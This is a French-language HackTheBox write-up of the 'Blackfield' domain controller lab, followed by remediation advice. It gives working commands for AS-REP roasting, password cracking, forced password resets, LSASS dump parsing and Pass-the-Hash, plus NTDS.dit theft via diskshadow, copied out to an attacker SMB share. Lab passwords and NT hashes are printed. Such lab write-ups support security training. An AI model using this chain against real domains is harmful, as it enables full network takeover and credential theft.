# Blackfield — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server 2019 (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-04 |
| **Vecteur** | `profiles$` (liste d'users) → **AS-REP roast** `support` → BloodHound **ForceChangePassword** `audit2020` → partage `forensic` (**dump LSASS**) → `svc_backup` → **SeBackupPrivilege** (NTDS.dit) → hash Administrator → PtH |
| **CVE** | aucune — abus de configuration AD |
| **Tags** | active-directory · as-rep-roast · force-change-password · lsass-dump · backup-operators |

> `<IP_CIBLE>` = IP de session (`10.129.229.17`). Domaine `blackfield.local`, DC = `DC01`.
> ⚙️ Dans `/etc/hosts` : `<IP_CIBLE>  blackfield.local BLACKFIELD.LOCAL dc01.blackfield.local`.

> 🎯 **Nouveautés apprises ici** :
> 1) **ForceChangePassword** (arête BloodHound) : réinitialiser le mot de passe d'un autre compte sans connaître l'ancien.
> 2) **Dump LSASS** hors ligne (`pypykatz`) pour extraire des identifiants.
> 3) **Backup Operators / `SeBackupPrivilege`** : sauvegarder `NTDS.dit` + ruche SYSTEM → extraire tous les hashes.

---

## TL;DR

Le partage SMB **`profiles$`** (lisible en anonyme) liste un dossier par utilisateur → `users.txt`.
**AS-REP roast** sur cette liste : seul **`support`** n'a pas de pré-auth → hash cassé (`hashcat -m 18200`)
→ `#00^BlackKnight`. BloodHound montre que `support` a **`ForceChangePassword`** sur **`audit2020`** → je
réinitialise son mot de passe. `audit2020` peut lire le partage **`forensic`** qui contient un **dump
mémoire de LSASS** → `pypykatz` en extrait le hash NT de **`svc_backup`**. Ce compte a WinRM **et** est
**Backup Operators** (`SeBackupPrivilege`) : je crée un shadow copy du C: (`diskshadow`), copie **`NTDS.dit`**
+ ruche **SYSTEM** en mode backup (`robocopy /b`), puis `secretsdump` hors ligne → hash **Administrator du
domaine** → **Pass-the-Hash** → DC compromis.

**`profiles$` → AS-REP (`support`) → ForceChangePassword (`audit2020`) → LSASS dump (`svc_backup`) → SeBackupPrivilege → NTDS.dit → Administrator.**

---

## 1. Reconnaissance & énumération

```bash
└─$ nmap -sC -sV -p- -oA blackfield 10.129.229.17
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          AD LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          AD LDAP (Global Catalog)
5985/tcp open  http          WinRM
Service Info: Host: DC01; OS: Windows Server 2019 Build 17763
|_clock-skew: 6h59m59s      # Kerberos sensible à l'heure → aligner si un ticket échoue
```

Partages SMB en anonyme (`guest`) :
```bash
└─$ nxc smb 10.129.229.17 -u guest -p '' --shares
   forensic                        Forensic / Audit share.   # (pas d'accès pour l'instant)
   IPC$            READ
   profiles$       READ                                       # ← liste d'utilisateurs
   SYSVOL / NETLOGON / C$ / ADMIN$
```

---

## 2. Construire la liste d'users (`profiles$`)

Le partage `profiles$` contient **un dossier par utilisateur** → les noms de dossiers = la `users.txt`.

```bash
└─$ smbclient -N //10.129.229.17/profiles$ -c 'ls' \
   | grep -oP '^\s+\K[^ ]+(?= +D)' \
   | grep -vE '^\.{1,2}$' > users.txt
# ~300+ comptes
```

---

## 3. Foothold — AS-REP roast → ForceChangePassword

**Méthode :** AS-REP roast sur `users.txt` → un seul compte sans pré-auth (`support`) → hash cassable
hors ligne. Puis BloodHound révèle une ACL abusable (`ForceChangePassword`) de `support` sur `audit2020`.

```bash
# ⚠️ -dc-ip OBLIGATOIRE : Kerberos résout le realm par son NOM, pas par l'IP
└─$ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt \
      -format hashcat -outputfile asrep.txt -dc-ip 10.129.229.17

└─$ cat asrep.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:31f6c256...   # un seul compte ressort : support

└─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
...:#00^BlackKnight
```

- **Compte AS-REP + mdp : `support` / `#00^BlackKnight`**

```bash
# collecte BloodHound avec support
└─$ bloodhound-ce-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c All --zip
```
Dans BloodHound : `support` → **Outbound Object Control** → **`ForceChangePassword` → audit2020**.
Clic droit sur l'arête → **Help → Linux Abuse** donne la commande :

```bash
net rpc password audit2020 'NewPass123!' -U "blackfield.local/support%#00^BlackKnight" -S 10.129.229.17
# ou : bloodyAD -u support -p '#00^BlackKnight' -d blackfield.local --host 10.129.229.17 set password audit2020 'NewPass123!'
```

- **Compte réinitialisé : `audit2020`** → mdp imposé : `NewPass123!`

> ⚠️ `audit2020` **n'a pas WinRM** (pas dans *Remote Management Users*) → inutile d'essayer evil-winrm avec.
> C'est un **compte-relais** : sa seule valeur est un **droit de lecture** sur le partage `forensic`.

---

## 4. Étape intermédiaire — dump LSASS

Avec `audit2020`, le partage **`forensic`** devient lisible → dossier `memory_analysis` avec un **`lsass.zip`**
(dump mémoire de LSASS). Extraction **hors ligne** :

```bash
└─$ unzip lsass.zip        # -> lsass.DMP
└─$ pypykatz lsa minidump lsass.DMP
Username: svc_backup
Domain: BLACKFIELD
NT: 9658d1d1dcd9250115e2205d9f48400d
```

- **Compte récupéré : `svc_backup`** (hash NT) — membre de **Backup Operators** + **Remote Management Users**.

**Flag user :** `C:\Users\svc_backup\Desktop\user.txt` (non publié).

```bash
# svc_backup a WinRM → Pass-the-Hash (pas besoin du mdp en clair)
└─$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

> **Pourquoi LSASS ?** LSASS garde en mémoire les secrets d'authentification. Un **dump** rejouable hors
> ligne = un mimikatz différé. Défense : **LSA Protection (RunAsPPL) / Credential Guard**.

---

## 5. Privesc — SeBackupPrivilege (Backup Operators)

```powershell
*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv
SeBackupPrivilege             Back up files and directories  Enabled    # ← le vecteur
SeRestorePrivilege            Restore files and directories  Enabled
```

`SeBackupPrivilege` = lire **n'importe quel fichier** en « mode sauvegarde » (contourne les ACL). `NTDS.dit`
est verrouillé par le DC → on en fait une **copie figée** (shadow copy) qu'on lit en mode backup.

```powershell
# 1) script diskshadow créé SUR la cible (Set-Content écrit du CRLF natif → pas de troncature)
cd C:\Windows\Temp
Set-Content shadow.txt "set context persistent nowriters"
Add-Content shadow.txt "add volume c: alias cdrive"
Add-Content shadow.txt "create"
Add-Content shadow.txt "expose %cdrive% z:"
diskshadow /s shadow.txt                 # crée le volume z: (copie figée du C:)

# 2) lire NTDS.dit depuis le shadow en mode backup, + la ruche SYSTEM
robocopy /b z:\Windows\NTDS . ntds.dit
reg save HKLM\SYSTEM C
```

Exfiltration via un partage SMB monté depuis Kali (le `download` d'evil-winrm plante — bug `EstandardError`) :
```bash
└─$ impacket-smbserver share ~/loot -smb2support -user a -password a
```
```powershell
net use \\<KALI_IP>\share /user:a a
copy C:\Windows\Temp\ntds.dit \\<KALI_IP>\share\ntds.dit
copy C:\Windows\Temp\C        \\<KALI_IP>\share\system.hive
```

Extraction des hashes du **domaine** (mode `LOCAL` = lit les fichiers, ne touche pas le DC) :
```bash
└─$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
[*] Target system bootKey: 0x73d83e56...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

```bash
# Pass-the-Hash avec le hash du DOMAINE (184fb5e5...)
└─$ evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

- Privilège abusé : **`SeBackupPrivilege`**
- Pourquoi ça marche (oral) : le droit « backup » autorise la **lecture de tout fichier** en contournant les ACL ; appliqué à `NTDS.dit` (la base de tous les comptes du domaine) + la ruche `SYSTEM` (clé de déchiffrement), `secretsdump` reconstitue **tous les hashes**, dont l'Administrateur.

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

---

## 6. Remédiation

- Activer la **pré-authentification** Kerberos partout (anti AS-REP) ; mots de passe de service longs (gMSA).
- Revoir les ACL **`ForceChangePassword`** (et les droits de contrôle d'objet en général).
- **LSA Protection (RunAsPPL) / Credential Guard** pour empêcher le dump LSASS ; ne pas laisser traîner de `lsass.dmp` sur un partage.
- Limiter **Backup Operators** aux seuls comptes de sauvegarde légitimes (accès **équivalent Domain Admin**).

---

## 7. Leçons & pièges rencontrés

- **La chaîne AD par ACL** : énumérer (`profiles$`) → roaster (`support`) → cartographier (BloodHound) → abuser une ACL (`ForceChangePassword`) → rebondir (`audit2020` lit un dump) → privilège local (`SeBackupPrivilege`) → NTDS.dit → PtH. Une box = une suite de **primitives** enchaînées, pas une CVE.
- **Tous les comptes ne servent pas à se connecter** : `audit2020` n'a pas WinRM, sa seule valeur est un **droit de lecture SMB**. Toujours regarder *ce que le compte permet* avant de vouloir un shell.
- **Piège `-dc-ip`** : Kerberos résout le realm par son **nom** → sans `-dc-ip` (+ `/etc/hosts`), `GetNPUsers` plante avec `Name or service not known` avant même de tester un compte. (Même famille que `KDC_ERR_WRONG_REALM` sur Sauna.)
- **Piège evil-winrm `download`** (`EstandardError`) → passer par **impacket-smbserver** (SMB) pour exfiltrer les gros fichiers binaires.
- **Piège diskshadow** : le mode interactif ne marche pas via WinRM → mode script `/s`, et le fichier doit être en **CRLF** (sinon le dernier caractère de chaque ligne saute : `nowriter` au lieu de `nowriters`). → créer le script sur la cible avec `Set-Content`.
- **Piège SAM ≠ NTDS** : le hash `Administrator:500` tiré du **SAM** (ex. via `nxc -M backup_operator`) est l'**admin LOCAL** (`67ef902e…`) → `STATUS_LOGON_FAILURE` sur un compte **de domaine**. Le bon hash (domaine) sort de **`NTDS.dit`** (`184fb5e5…`). Sur un DC, bien distinguer comptes locaux (SAM) et comptes de domaine (NTDS).

---

## Références

- Fiches liées : [smb](../outils/smb.md) · [bloodhound](../outils/bloodhound.md) · [ad-attacks](../outils/ad-attacks.md) · [windows-privesc](../outils/windows-privesc.md) · [impacket](../outils/impacket.md) · [hashcat](../outils/hashcat.md)
